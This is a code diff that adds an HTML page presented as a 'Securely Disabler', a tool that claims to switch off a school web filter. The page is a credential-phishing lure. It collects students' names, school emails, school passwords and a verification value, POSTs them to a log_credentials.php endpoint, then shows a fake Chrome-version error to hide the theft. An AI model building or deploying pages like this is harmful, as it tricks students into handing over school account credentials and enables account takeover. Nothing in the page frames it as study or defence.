@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Securely Disabler</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        h1 {
+            color: #ff6347;
+        }
+        p {
+            color: #333;
+        }
+        .button {
+            background-color: #4caf50;
+            color: white;
+            padding: 10px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin-top: 20px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Securely Disabler</h1>
+        <p>This script disables Securely on the Wi-Fi network you are using.</p>
+        <p>Please provide the required information:</p>
+        <form id="submitForm">
+            <label for="firstName">First Name:</label><br>
+            <input type="text" id="firstName" name="firstName"><br>
+            <label for="email">School Email:</label><br>
+            <input type="email" id="email" name="email"><br>
+            <label for="password">School Password:</label><br>
+            <input type="password" id="password" name="password"><br>
+            <label for="verification">Image Verification:</label><br>
+            <input type="text" id="verification" name="verification"><br>
+            <label for="action">Remove or Re-enable Securely:</label><br>
+            <select id="action" name="action">
+                <option value="remove">Remove</option>
+                <option value="enable">Re-enable</option>
+            </select><br><br>
+            <button type="button" class="button" onclick="submitForm()">Submit</button>
+        </form>
+        <p id="output"></p>
+    </div>
+
+    <script>
+        function submitForm() {
+            var firstName = document.getElementById("firstName").value;
+            var email = document.getElementById("email").value;
+            var password = document.getElementById("password").value;
+            var verification = document.getElementById("verification").value;
+            var action = document.getElementById("action").value;
+
+            // Construct the data to be logged
+            var data = "First Name: " + firstName + "\n" +
+                       "School Email: " + email + "\n" +
+                       "School Password: " + password + "\n" +
+                       "Image Verification: " + verification + "\n" +
+                       "Action: " + action + "\n\n";
+
+            // Log the data to errorcodes.txt
+            var xhttp = new XMLHttpRequest();
+            xhttp.open("POST", "log_credentials.php", true);
+            xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+            xhttp.send("data=" + encodeURIComponent(data));
+
+            // Reset form fields
+            document.getElementById("submitForm").reset();
+
+            // Display success message
+            document.getElementById("output").innerHTML = "Error acessing securely API. Please Check Chrome Version And try again. This script won't work above v119 due to chrome patching API calles to extentions. Please update to v119 or above.";";
+        }
+    </script>
+</body>
+</html>
